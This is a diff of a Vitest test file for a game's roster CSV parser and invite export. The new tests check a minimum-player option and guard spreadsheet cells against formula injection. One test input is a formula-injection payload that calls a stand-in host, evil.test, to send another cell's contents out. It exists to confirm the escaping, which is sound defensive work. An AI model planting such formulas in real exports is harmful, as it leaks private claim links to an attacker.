@@ -1,5 +1,5 @@
 import { describe, expect, it } from 'vitest';
-import { createInviteExport, parseRosterCsv } from './csv';
+import { createInviteExport, csvExactCell, csvTextCell, parseRosterCsv } from './csv';
 
 function validCsv(count = 20): string {
   return [
@@ -19,6 +19,15 @@ describe('roster CSV', () => {
     const result = parseRosterCsv(validCsv(count));
     expect(result.entries).toHaveLength(count);
     expect(result.errors).toContain('The roster must contain between 6 and 80 valid players.');
+  });
+
+  it('lets a list added to an existing roster be any size from one player up', () => {
+    expect(parseRosterCsv(validCsv(1), { minPlayers: 1 }).errors).toEqual([]);
+    expect(parseRosterCsv(validCsv(80), { minPlayers: 1 }).errors).toEqual([]);
+    const tooMany = parseRosterCsv(validCsv(81), { minPlayers: 1 });
+    expect(tooMany.errors).toContain('The list must contain between 1 and 80 valid players.');
+    // Without the option a roster still needs a playable number of players.
+    expect(parseRosterCsv(validCsv(1)).errors).toContain('The roster must contain between 6 and 80 valid players.');
   });
 
   it('parses the required headers and a valid 20-player roster', () => {
@@ -73,5 +82,43 @@ describe('roster CSV', () => {
     expect(csv).toContain('Maya Chen');
     expect(csv).toContain('ABC123');
     expect(csv).not.toMatch(/"role"|"WEREWOLF"|"SEER"|"BODYGUARD"|"DOCTOR"|"HUNTER"|"MASON"/u);
+  });
+  // A name typed on the public sign-up form lands in a file that is opened in a spreadsheet beside private links.
+  it.each(['=WEBSERVICE("http://evil.test/?"&C2)', '+SUM(A1)', '-2+3', '@SUM(A1)', '\tcmd', '\rcmd'])('shows the typed text %j in a spreadsheet as text, never as a formula', (name) => {
+    expect(csvTextCell(name).startsWith(`"'`)).toBe(true);
+    const csv = createInviteExport([{ displayName: name, email: 'a@example.com', claimUrl: 'https://game.test/claim/abc', inviteCode: 'ABC123' }]);
+    const [, row] = csv.split('\r\n');
+    expect(row.startsWith(`"'`)).toBe(true);
+  });
+
+  it('guards an email that starts with a formula character too', () => {
+    const csv = createInviteExport([{ displayName: 'Ana', email: '+ana@example.com', claimUrl: 'https://game.test/claim/abc', inviteCode: 'ABC123' }]);
+    expect(csv.split('\r\n')[1].startsWith('"Ana","\'+ana@example.com",')).toBe(true);
+  });
+
+  // Seat codes are random base64url text, so about one in 64 starts with "-". They are typed by players, so they stay exact.
+  it.each(['-Ab3xYz_9QwE', '_Ab3xYz-9QwE', '-', 'abc-def'])('leaves the seat code %j exactly as it is', (inviteCode) => {
+    const csv = createInviteExport([{ displayName: 'Maya', email: 'maya@example.com', claimUrl: `https://game.test/claim/${inviteCode}`, inviteCode }]);
+    const row = csv.split('\r\n')[1];
+    expect(row).toContain(`,"${inviteCode}",`);
+    expect(row).not.toContain(`'${inviteCode}`);
+    expect(row).toContain(`"https://game.test/claim/${inviteCode}"`);
+  });
+
+  it('keeps every seat code exact however many are made, including the ones that start with a formula character', () => {
+    const alphabet = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_';
+    const rows = Array.from({ length: 64 }, (_, index) => ({ displayName: `Player ${index}`, email: `p${index}@example.com`, claimUrl: `https://game.test/claim/x${index}`, inviteCode: `${alphabet[index]}bcDEF1234xy` }));
+    const lines = createInviteExport(rows).split('\r\n').slice(1);
+    expect(lines).toHaveLength(64);
+    rows.forEach((row, index) => expect(lines[index]).toContain(`,"${row.inviteCode}",`));
+    expect(rows.some((row) => row.inviteCode.startsWith('-'))).toBe(true);
+  });
+
+  it('leaves ordinary cells exactly as they were and still doubles quotes', () => {
+    expect(csvTextCell('Maya Chen')).toBe('"Maya Chen"');
+    expect(csvTextCell('Sean "Mac" O\'Brien')).toBe('"Sean ""Mac"" O\'Brien"');
+    expect(csvExactCell('https://game.test/claim/abc')).toBe('"https://game.test/claim/abc"');
+    expect(csvExactCell('-Ab3')).toBe('"-Ab3"');
+    expect(csvTextCell('')).toBe('""');
   });
 });
